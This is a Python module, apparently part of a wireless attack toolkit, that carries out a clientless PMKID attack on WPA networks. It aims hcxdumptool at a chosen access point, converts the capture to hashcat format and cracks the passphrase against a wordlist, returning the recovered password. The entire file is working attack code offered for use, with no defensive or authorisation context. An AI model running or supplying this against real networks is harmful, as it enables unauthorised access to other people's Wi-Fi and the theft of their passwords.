"""
attacks/pmkid.py - PMKID attack (clientless)
Works without waiting for a client to connect.
Supported by most modern routers (802.11r).
Uses hcxdumptool to capture PMKID, hashcat to crack.
"""

import subprocess
import time
import os
import re
from utils.logger import Logger
from utils.tools import check_tool

log = Logger()


class PMKIDAttack:
    def __init__(self, interface, target, wordlist=None,
                 output_dir="./captures", deauth_count=5, timeout=60):
        self.interface = interface
        self.target = target
        self.wordlist = wordlist
        self.output_dir = output_dir
        self.timeout = timeout
        self._pcapng_file = None
        self._hash_file = None

    def run(self):
        """Capture PMKID using hcxdumptool"""
        if not check_tool("hcxdumptool"):
            log.warn("hcxdumptool not found, skipping PMKID attack")
            log.info("Install: sudo dnf install hcxdumptool OR build from source")
            return {"captured": False}

        bssid = self.target["bssid"]
        essid = self.target["essid"]
        channel = self.target.get("channel", "0")

        # Create filter file (target specific BSSID)
        filter_file = os.path.join(self.output_dir, "pmkid_filter.txt")
        bssid_clean = bssid.replace(":", "").lower()

        with open(filter_file, "w") as f:
            f.write(bssid_clean + "\n")

        self._pcapng_file = os.path.join(
            self.output_dir,
            f"pmkid_{essid.replace(' ', '_')}_{bssid_clean}.pcapng"
        )
        self._hash_file = self._pcapng_file.replace(".pcapng", ".22000")

        log.info(f"Capturing PMKID from {essid} ({bssid})...")
        log.info(f"This is clientless — no need to wait for users to connect")

        cmd = [
            "hcxdumptool",
            "-i", self.interface,
            "-o", self._pcapng_file,
            "--filterlist_ap=" + filter_file,
            "--filtermode=2",
            "--enable_status=1",
        ]

        # Add channel if known
        if channel and channel.isdigit() and int(channel) > 0:
            cmd += ["-c", channel]

        try:
            proc = subprocess.Popen(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
                text=True
            )

            start = time.time()
            pmkid_found = False

            while time.time() - start < self.timeout:
                elapsed = int(time.time() - start)

                # Check output for PMKID indicator
                try:
                    line = proc.stdout.readline()
                    if line:
                        if "PMKID" in line.upper() or "found" in line.lower():
                            pmkid_found = True
                            break
                except Exception:
                    pass

                # Also check if file has grown (data captured)
                if os.path.exists(self._pcapng_file):
                    size = os.path.getsize(self._pcapng_file)
                    if size > 200:  # meaningful data
                        pmkid_found = True
                        break

                print(f"\r[*] PMKID hunt... {elapsed}s / {self.timeout}s", end="", flush=True)
                time.sleep(1)

            print()
            proc.terminate()
            proc.wait()

        except Exception as e:
            log.error(f"hcxdumptool error: {e}")
            return {"captured": False}

        if pmkid_found and os.path.exists(self._pcapng_file):
            # Convert to hashcat format
            if self._convert_to_hashcat():
                log.success(f"PMKID captured and converted: {self._hash_file}")
                return {"captured": True, "capfile": self._hash_file, "type": "pmkid"}
            else:
                log.warn("Capture exists but conversion failed")
                return {"captured": True, "capfile": self._pcapng_file, "type": "pmkid_raw"}
        else:
            log.warn("No PMKID captured within timeout")
            return {"captured": False}

    def _convert_to_hashcat(self):
        """Convert pcapng to hashcat 22000 format"""
        # Try hcxpcapngtool (newer)
        if check_tool("hcxpcapngtool"):
            result = subprocess.run(
                ["hcxpcapngtool", "-o", self._hash_file, self._pcapng_file],
                capture_output=True, text=True
            )
            if os.path.exists(self._hash_file) and os.path.getsize(self._hash_file) > 0:
                return True

        # Try hcxpcaptool (older)
        if check_tool("hcxpcaptool"):
            result = subprocess.run(
                ["hcxpcaptool", "-z", self._hash_file, self._pcapng_file],
                capture_output=True, text=True
            )
            if os.path.exists(self._hash_file) and os.path.getsize(self._hash_file) > 0:
                return True

        return False

    def crack(self, hashfile):
        """Crack PMKID hash with hashcat"""
        if not self.wordlist:
            return None

        if not check_tool("hashcat"):
            log.warn("hashcat not found")
            return None

        log.info(f"Cracking PMKID with hashcat (mode 22000)...")
        log.info(f"Wordlist: {self.wordlist}")

        potfile = hashfile + ".pot"

        cmd = [
            "hashcat",
            "-m", "22000",          # WPA-PMKID-PBKDF2
            hashfile,
            self.wordlist,
            "--potfile-path", potfile,
            "--quiet",
            "--status",
            "--status-timer", "10",
        ]

        try:
            result = subprocess.run(
                cmd,
                capture_output=True, text=True,
                timeout=600
            )

            # Check potfile for cracked password
            if os.path.exists(potfile):
                with open(potfile) as f:
                    content = f.read().strip()
                if content:
                    # Format: hash:password
                    parts = content.split(":")
                    if parts:
                        return parts[-1]

            # Check stdout
            for line in result.stdout.splitlines():
                if ":" in line and not line.startswith("#"):
                    parts = line.strip().split(":")
                    if len(parts) >= 2:
                        return parts[-1]

        except subprocess.TimeoutExpired:
            log.warn("Hashcat timed out")
        except Exception as e:
            log.error(f"Hashcat error: {e}")

        return None
